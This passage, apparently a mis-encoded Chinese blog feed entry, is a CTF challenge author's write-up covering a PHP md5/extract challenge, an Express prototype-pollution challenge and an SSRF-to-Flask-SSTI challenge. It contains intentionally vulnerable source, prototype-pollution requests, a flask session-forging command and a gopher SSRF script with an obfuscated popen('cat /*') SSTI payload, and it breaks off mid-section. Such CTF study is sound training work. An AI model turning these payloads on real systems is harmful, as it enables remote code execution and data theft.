    <category term="WP" scheme="https://1llustrious.github.io/tags/WP/"/>
    
    <category term="å¤ç°" scheme="https://1llustrious.github.io/tags/%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>PCTFå°è®°</title>
    <link href="https://1llustrious.github.io/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/"/>
    <id>https://1llustrious.github.io/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/</id>
    <published>2023-12-08T16:00:21.000Z</published>
    <updated>2023-12-09T02:30:13.535Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="å†™åœ¨å‰é¢"><span id="å†™åœ¨å‰é¢"> å†™åœ¨å‰é¢</span></h1><p>nmdæ–°ç”Ÿèµ›ä¸€å †è€ä¸œè¥¿æ¥ğŸ’¥ğŸŸæ˜¯å§.</p><p>ğŸ‘´æœ¬æ¥å‡ºäº†ä¸‰é“é¢˜,ä½†æ˜¯æœ‰é“é¢˜å› ä¸ºåå­—å†™é”™äº†,å¯¼è‡´æ²¡ä¸Šæˆ,ğŸ‘´çœŸtmæ˜¯ä¸ªsb,ğŸ‘´è‡ªè®¤ä¸ºé¢˜ç›®å‡ºçš„ç®€å•äº†,ä»¥ä¸‹ç»†è¯´.</p><h1 id="åºŸæ¡ˆä¹‹easy_php"><span id="åºŸæ¡ˆä¹‹easy_php"> åºŸæ¡ˆä¹‹easy_php</span></h1><p>ğŸ‘´tmæœ¬æ¥æŠ•é¢˜å†™çš„æ˜¯easy_php,ç»“æœåœ¨å‡ºé¢˜æ–‡æ¡£å†™äº†ez_php,Xennyè€å¸ˆæ²¡ç»™æˆ‘ä¸Š,ä¸è¿‡æ²¡å•¥äº‹,æ¯•ç«Ÿè¿™é¢˜å¤ªç®€å•äº†.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$param1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>];</span><br><span class="line"><span class="variable">$param2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$param2</span>!==<span class="variable">$param1</span>&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$param2</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$param1</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å¤ªå¥½äº†,ä½ ç»•è¿‡äº†æœ€ç®€å•çš„ä¸€å±‚&lt;br/&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$num</span>)&lt;=<span class="number">3</span> &amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>)&gt;<span class="number">999999999</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ­å–œä½ è¿›æ¥äº†,ç»§ç»­å§&lt;br/&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$kanozyo</span> = <span class="string">&quot;katoumegumi&quot;</span>;</span><br><span class="line">        <span class="variable">$kami</span> = <span class="string">&quot;enterprise&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTsgPz4=&quot;</span>);</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;new_file.php&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$kanozyo</span>===<span class="string">&quot;lishanweilai&quot;</span>&amp;&amp;<span class="variable">$kami</span> === <span class="string">&quot;korey0sh1&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="string">&quot;&lt;?php die();&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;å¤ªå¯æƒœäº†,æˆ‘å¹¶ä¸æ˜¯ç¥,æˆ‘çš„è€å©†å¯æ˜¯æ —å±±æœªæ¥&lt;br/&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä¸å¤Ÿå¤§,å¤ªé•¿äº†&lt;br/&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;è¿™ä¹ˆç®€å•çš„md5éƒ½ä¸ä¼šç»•?&lt;br/&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åæ­£phpç‰¹æ€§çš„æ€»ç»“,å¤ªç®€å•äº†,ğŸ‘´ä¸æƒ³å†™wpäº†</p><h1 id="æˆç¥ä¹‹æ—¥"><span id="æˆç¥ä¹‹æ—¥"> æˆç¥ä¹‹æ—¥</span></h1><p>åŒæ ·ç®€å•çš„js,æˆ‘ä»¥ä¸ºå¾ˆå¤šè€ä¸œè¥¿èƒ½è§£å‡ºæ¥,æ²¡æƒ³åˆ°åªæœ‰ä¸¤ä¸ª,è¿˜æœ‰ä¸€ä¸ªæ˜¯tmé—®æˆ‘æ€è·¯çš„.</p><p>æºç ç»™ä½ äº†</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> list = &#123;</span><br><span class="line">    <span class="string">&#x27;PWN&#x27;</span>:<span class="string">&#x27;korey0sh1&#x27;</span>,<span class="string">&#x27;WEB1&#x27;</span>:<span class="string">&#x27;welk1n&#x27;</span>,<span class="string">&#x27;WEB2&#x27;</span>:<span class="string">&#x27;zymic&#x27;</span>,<span class="string">&#x27;MISC&#x27;</span>:<span class="string">&quot;Cat_zn&quot;</span>,<span class="string">&#x27;CRYPTO&#x27;</span>:<span class="string">&#x27;Big_Dick&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> flag = process.<span class="property">env</span>.<span class="property">FLAG</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateRandomNumber</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> randomBytes = crypto.<span class="title function_">randomBytes</span>(<span class="number">4</span>); </span><br><span class="line">    <span class="keyword">const</span> randomNumber = randomBytes.<span class="title function_">readUInt32LE</span>(<span class="number">0</span>); </span><br><span class="line">    <span class="keyword">return</span> randomNumber;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> admin_token = <span class="title function_">generateRandomNumber</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">hash</span> = (<span class="params">token</span>) =&gt; crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>).<span class="title function_">update</span>(token).<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);<span class="comment">//ç®€å•çš„md5åŠ å¯†æ</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    res.<span class="title function_">sendFile</span>(__dirname + <span class="string">&quot;/index.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/src&#x27;</span>, <span class="function">(<span class="params">_, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(__filename);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/api/add&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; x, y, namae &#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (x &amp;&amp; y &amp;&amp; namae) list[x][y] = namae;</span><br><span class="line">    res.<span class="title function_">json</span>(list);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> userData = &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">cookies</span> &amp;&amp; req.<span class="property">cookies</span>.<span class="property">admin</span> === <span class="literal">true</span>) &#123;</span><br><span class="line">        userData.<span class="property">admin</span> = <span class="literal">true</span></span><br><span class="line">        userData.<span class="property">token</span> = admin_token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (userData.<span class="property">admin</span> &amp;&amp; req.<span class="property">query</span>.<span class="property">token</span></span><br><span class="line">        &amp;&amp; <span class="title function_">hash</span>(<span class="string">`Korey0sh1_love_you<span class="subst">$&#123;req.query.token&#125;</span>zymic_1s_god`</span>) === userData.<span class="property">token</span>) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(flag);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="string">&quot;0.0.0.0&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾flagæ˜¯éœ€è¦æ¡ä»¶çš„,éœ€è¦<code>userData.admin</code>ä¸º<code>true</code>,ä¸”å’Œå­—ç¬¦ä¸²æ‹¼æ¥å<code>md5</code>åŠ å¯†çš„å€¼ä¸<code>userData.token</code>ç›¸åŒ.</p><p>çœ‹åˆ°è¿™é‡Œ,æœ‰å¸ˆå‚…æƒ³ç€é€šè¿‡cookiesè¿›å…¥if,ä½¿å¾—userData.adminä¸ºtrue,æ­å–œä½ ,ä½ éœ€è¦é‡å¯é¶æœºäº†ğŸ¤£.</p><h2 id="æ­£è§£å¦‚ä¸‹"><span id="æ­£è§£å¦‚ä¸‹"> æ­£è§£å¦‚ä¸‹</span></h2><h3 id="åŸå‹é“¾æ±¡æŸ“"><span id="åŸå‹é“¾æ±¡æŸ“"> åŸå‹é“¾æ±¡æŸ“</span></h3><p>è¿™æ®µè·¯ç”±å¯æ§å˜é‡å¤ªå¤šäº†,jsæœ‰ä¸ªä¸œè¥¿å«åšåŸå‹é“¾æ±¡æŸ“,ç®€å•æ¥è¯´å°±æ˜¯æ¯ä¸ªå¯¹è±¡é»˜è®¤æœ‰ä¸ªå±æ€§<code>Prototype</code>æŒ‡å‘å¯¹è±¡çš„åŸå‹,å¹¶ä¸”å¯¹è±¡çš„åŸå‹ä¹Ÿæ˜¯åŸå‹.</p><p>å¤§éƒ¨åˆ†æ­£å¸¸å¯¹è±¡çš„åŸå‹æ˜¯<code>Object</code>.å¯ä»¥è®¤ä¸º<code>Object</code>æ˜¯æ‰€æœ‰ç±»çš„çˆ¶ç±»,<code>Object</code>ä¹Ÿæœ‰è‡ªå·±çš„åŸå‹,å°±æ˜¯<code>NULL</code>,<code>Object</code>çš„æ„é€ å‡½æ•°æŒ‡å‘<code>Function</code>.</p><p><code>Function</code>æ˜¯ç”¨äºåˆ›é€ å‡½æ•°å¯¹è±¡çš„,åœ¨js,å‡½æ•°ä¹Ÿå¯ä»¥çœ‹ä½œå¯¹è±¡,ä¸è¿‡è¿™é‡Œå°±ä¸ç»†è®²äº†.</p><p>ç„¶åä¸€ä¸ªå¯¹è±¡å¯ä»¥é€šè¿‡è®¿é—®å…¶<code>__proto__</code>å»è·å–å®ƒçš„åŸå‹å¯¹è±¡.</p><p>jsæœ‰ä¸ªç‰¹æ€§,é‚£å°±æ˜¯å¦‚æœè®¿é—®ä¸€ä¸ªå±æ€§,è¿™ä¸ªå±æ€§è¯¥å¯¹è±¡ä¸å…·å¤‡çš„è¯,å¹¶ä¸ä¼šç›´æ¥è¿”å›undefined,è€Œæ˜¯ä¼šé¡ºç€å…¶åŸå‹é“¾ä¸€çº§ä¸€çº§å¾€ä¸Šæ‰¾,ç±»ä¼¼äºå­ç±»æ‰¾ä¸åˆ°çš„å±æ€§ä»çˆ¶ç±»æ‰¾,ä½†æ˜¯JSå¯ä»¥æ‰¾åˆ°å‘ä¸Šæ‰¾Object,ç„¶ååˆ°<code>NULL</code>,éƒ½æ²¡æœ‰çš„è¯,å°±ä¼šè¿”å›undefined.</p><p>æ³¨æ„:å¦‚æœè¦åŸå‹é“¾æ±¡æŸ“,ä¸€å®šéœ€è¦è¯¥å¯¹è±¡æ²¡æœ‰æŸä¸ªå±æ€§çš„å€¼,å¦‚æœè¯¥å¯¹è±¡æŸä¸ªå±æ€§çš„å€¼å­˜åœ¨,å°±ä¼šç›´æ¥è¿”å›.</p><p>æ‰€ä»¥æˆ‘è¯´ä¹‹å‰é cookiesçš„å¸ˆå‚…,æ­å–œä½ ä»¬æ‰è¿›å‘é‡Œäº†,æƒ³è¦åšå‡ºæ¥è¿˜æ˜¯å¾—é‡å¯é¶æœºäº†.ğŸ˜ŠğŸ¤£</p><p>å¦‚æœä¸¤ä¸ªå¯¹è±¡å…±äº«ä¸€ä¸ªåŸå‹,é€šè¿‡å…¶ä¸­ä¸€ä¸ªå¯¹è±¡æ”¹å˜äº†åŸå‹çš„å±æ€§,é‚£ä¹ˆä¹Ÿä¼šå½±å“å¦ä¸€ä¸ªå¯¹è±¡çš„åŸå‹.</p><h3 id="é¢˜ç›®å®ç°"><span id="é¢˜ç›®å®ç°"> é¢˜ç›®å®ç°</span></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/api/add&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; x, y, namae &#125; = req.<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">if</span> (x &amp;&amp; y &amp;&amp; namae) list[x][y] = namae;</span><br><span class="line">    res.<span class="title function_">json</span>(list);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>å¤§éƒ¨åˆ†é¢˜ç›®éƒ½ä¼šå»æ±¡æŸ“<code>Object</code>,æ¯•ç«ŸObjectåŸºæœ¬ä¸Šæ˜¯æ‰€æœ‰å¯¹è±¡éƒ½ä¼šæœ‰çš„åŸå‹.</p><p>è¿™é‡Œ<code>x</code>,<code>y</code>,<code>namae</code>éƒ½å¯æ§,ç›´æ¥æ”¹åŸå‹å°±è¡Œäº†.</p><p>è¿™é‡Œå°±å¯ä»¥å°†<code>admin</code>æ”¹æˆ<code>true</code>,ä½†æ˜¯è¿˜ä¸å¤Ÿ,è¿˜è¦å°†tokenæ”¹æˆæˆ‘ä»¬æƒ³è¦çš„ä»»æ„å€¼,æ±¡æŸ“userdataçš„åŸå‹,å½±å“å…¶tokençš„è¿”å›å€¼</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/api/add?x=__proto__&amp;y=admin&amp;namae=<span class="number">1</span></span><br><span class="line">/api/add?x=__proto__&amp;y=token&amp;namae=33e981e155eb62f5646de98c23e0ce02</span><br><span class="line">/flag?token=<span class="number">1</span></span><br></pre></td></tr></table></figure><p>è¿™ä¹ˆæ‰“å°±èƒ½æ»¡è¶³æ¡ä»¶äº†.</p><h1 id="double_ssä¹‹æ­£è§£"><span id="double_ssä¹‹æ­£è§£"> Double_SSä¹‹æ­£è§£</span></h1><p>è¿™é“é¢˜æœ¬æ¥æ˜¯æƒ³æ•´ä¸ªSSRFè§¦å‘SSTIçš„,ç„¶åæµ‹è¯•çš„æ—¶å€™ä¸æ–­ä¿®æ”¹,å…ˆæ˜¯fileåè®®ç›´æ¥è¯»flagçš„éé¢„æœŸ,æ°”å¾—ğŸ‘´ç›´æ¥å°†flagæ”¹æˆ400æƒé™äº†,ç„¶åpythonæœåŠ¡ç”¨rootå¼€å¯,è¿™æ ·å­åªèƒ½é€šè¿‡pythonå»è¯»ğŸ‘´çš„flag,ğŸ‘´çœŸtmæ˜¯ä¸ªå¤©æ‰.</p><p>ä¸è¿‡ğŸ‘´å¹¶æ²¡æœ‰banå„ç§åè®®,è¿™å°±å¯¼è‡´æˆ‘åé¢å‘ç°äº†ä¸€ä¸ªéé¢„æœŸ,ä¸è¿‡è¿™ä¸ªéé¢„æœŸæ¯”é¢„æœŸå¤æ‚ç¨‹åº¦é«˜å¤šäº†,å½“ç„¶æˆ‘åé¢ä¹Ÿä¼šå†™,æƒ³å­¦çš„å¸ˆå‚…å¯ä»¥çœ‹çœ‹.</p><h2 id="æºç é‰´èµä¸€æ³¢"><span id="æºç é‰´èµä¸€æ³¢"> æºç é‰´èµä¸€æ³¢</span></h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="title function_">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_">highlight_file</span>(__FILE__);</span><br><span class="line">$url=$_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">$ch=<span class="title function_">curl_init</span>($url);</span><br><span class="line"><span class="title function_">curl_setopt</span>($ch, <span class="variable constant_">CURLOPT_HEADER</span>, <span class="number">0</span>);</span><br><span class="line"><span class="title function_">curl_setopt</span>($ch, <span class="variable constant_">CURLOPT_RETURNTRANSFER</span>, <span class="number">1</span>);</span><br><span class="line">$result=<span class="title function_">curl_exec</span>($ch);</span><br><span class="line"><span class="title function_">curl_close</span>($ch);</span><br><span class="line">echo ($result);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//try to access 5555 port</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å›åˆ°æ­£é¢˜,ä¸Šæ¥å°±æ˜¯phpæºç ,å¾ˆæ˜æ˜¾æ‰“ä¸ªSSRF,ğŸ‘´è¿˜è´´å¿ƒåœ°å‘Šè¯‰ä½ æ‰¾5555ç«¯å£(å…¶å®æ˜¯ğŸ‘´å¿˜äº†æœ‰fileåè®®è¿™ç©æ„å¯ä»¥è¯»æºç ,ä¸ç„¶ğŸ‘´æŠŠè¿™ä¸ªhintç»™ä½ banäº†,éš¾æ­»ä½ ä»¬å‡ ä¸ªbyd)</p><p>ç„¶åæ‰“è¿‡å»,å‘ç°æœ‰å›æ˜¾,å¾ˆæ˜æ˜¾æ˜¯ä¸ªflask,ğŸ‘´ç”šè‡³è¿˜å‘Šè¯‰ä½ <code>secretkey</code>,å¤Ÿä»æ…ˆäº†å§.</p><p>ä¸ç„¶ğŸ‘´ç›´æ¥è®©ä½ è¯»å†…å­˜æ‹¿key.</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702047781163-1702087704091-1.png" alt="1702047781163"></p><p>ğŸ‘´è¿˜å‘Šè¯‰ä½ æ€ä¹ˆSSTIäº†,é‚£ä¹ˆå°±å¾ˆç®€å•äº†.</p><p>ä¸æ‡‚SSTIçš„è‡ªè¡Œä¸Šç½‘æœ,ç½‘ä¸Šå¤§æŠŠæ–‡ç« ,ğŸ‘´çš„wafä¹Ÿåªæ˜¯è±¡å¾æ€§åœ°å†™ä¸€ä¸‹,ç»•ä¸€ä¸‹å¾ˆå®¹æ˜“çš„.</p><p>è¿™é‡Œè¿˜æ¶‰åŠåˆ°flasksessionä¼ªé€ çš„.</p><h2 id="flasksessionä¼ªé€ "><span id="flasksessionä¼ªé€ "> flasksessionä¼ªé€ </span></h2><h3 id="ç›´æ¥ä¸Šè„šæœ¬"><span id="ç›´æ¥ä¸Šè„šæœ¬"> ç›´æ¥ä¸Šè„šæœ¬</span></h3><p>è„šæœ¬ç½‘ä¸Šå¾ˆå¤š,å…¶ä¸­æ¯”è¾ƒå¸¸ç”¨çš„æ˜¯</p><p><a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><p>ç”¨æ³•ä¹Ÿæœ‰,ç®€å•å±•ç¤ºä¸€ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.<span class="property">py</span> encode -s <span class="string">&quot;76bcf327-fd33-44f3-98eb-530a7351ea1d&quot;</span> -t <span class="string">&quot;&#123;&#x27;admin&#x27;:1&#125;&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702048442240-1702087704091-2.png" alt="1702048442240"></p><h3 id="æœ¬åœ°ç”Ÿæˆ"><span id="æœ¬åœ°ç”Ÿæˆ"> æœ¬åœ°ç”Ÿæˆ</span></h3><p>è¿™ä¸ªæ›´ç®€å•äº†,è¿™ç§æ€ç»´åº”å¯¹å¾ˆå¤šé¢˜ç›®éƒ½éå¸¸æœ‰ç”¨.</p><p>ğŸ‘´æ²¡banfileåè®®,ç›´æ¥è¯»æºç éƒ½è¡Œ<img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702048496042-1702087704091-3.png" alt="1702048496042"></p><p>ç†è®ºä¸Šè‡ªå·±å†™ä¸ªflask,è®¾ç½®ä¸€ä¸‹keyè®¿é—®éƒ½è¡Œ,å®åœ¨ä¸ä¼š,æŠŠæºç æ”¾åœ¨æœ¬åœ°é‡Œè·‘,keyä¸€æ¢å°±è¡Œäº†</p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702049073350-1702087704091-4.png" alt="1702049073350"></p><p><img src="/2023/12/09/PCTF%E5%B0%8F%E8%AE%B0/1702049061471-1702087704091-5.png" alt="1702049061471"></p><h2 id="gopheråè®®"><span id="gopheråè®®"> gopheråè®®</span></h2><p>sessionæå®šäº†,ä½†æ˜¯æœ€ç»ˆè¿˜æœ‰ä¸ªé—®é¢˜,å°±æ˜¯ç›´æ¥å»è¯·æ±‚åªèƒ½æºå¸¦getå‚æ•°,ä¸èƒ½æºå¸¦cookie.</p><p>äºæ˜¯è¿™æ—¶å€™å°±éœ€è¦ç”¨çš„<code>gopher</code>åè®®äº†,ç®€å•æ¥è¯´,å°±æ˜¯å¯ä»¥é€šè¿‡ä¸€ç§ç‰¹æ®Šçš„å½¢å¼,ä¼ é€’å®Œæ•´çš„æ•°æ®åŒ…,åŒ…æ‹¬æºå¸¦headers,postä¼ å‚ä¹‹ç±»çš„.</p><p>å½¢å¼å¦‚ä¸‹:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">gopher</span>:<span class="comment">//127.0.0.1&lt;:portçˆ±å†™ä¸å†™&gt;/_&lt;äºŒæ¬¡urlç¼–ç è¿‡åçš„æ•´ä¸ªæŠ¥æ–‡&gt;</span></span><br></pre></td></tr></table></figure><p>äºæ˜¯ä½¿ç”¨pythonçš„<code>+urllib.parse</code>åˆ¶é€ ä¸€ä¸ªè„šæœ¬å¦‚ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.<span class="property">parse</span></span><br><span class="line">test2 =\</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;GET /name?name=%7B%7B%22%22%5B%22__c%22%22lass__%22%5D%5B%22__b%22%22ases__%22%5D%5B0%5D%5B%22__subcl%22%22asses__%22%5D()%5B133%5D%5B%22__in%22%22it__%22%5D%5B%22__gl%22%22obals__%22%5D%5B&#x27;po&#x27;&#x27;pen&#x27;%5D(&#x27;ca&#x27;&#x27;t%20%2F*&#x27;).read()%7D%7D HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1:5555</span></span><br><span class="line"><span class="string">Cookie: session=eyJhZG1pbiI6MX0.ZXM1Hw.3T3ehyY4yIAG3x107z5UT3hKTD4</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="string">&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">tmp = urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(test2)</span><br><span class="line"><span class="keyword">new</span> = tmp.<span class="title function_">replace</span>(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:5555/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+urllib.<span class="property">parse</span>.<span class="title function_">quote</span>(<span class="keyword">new</span>)</span><br><span class="line"><span class="title function_">print</span>(result)</span><br></pre></td></tr></table></figure><p>ä¸è¿‡ç”±äºpythonå¤šè¡Œå¼•ç”¨æ˜¯åªæœ‰å•æ¢è¡Œ,è€ŒæŠ¥æ–‡ç»“å°¾æ˜¯<code>\r\n</code>,æ‰€ä»¥éœ€è¦æ›¿æ¢ä¸€ä¸‹.</p><p>æœ€åsstiå¦‚ä¸‹</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 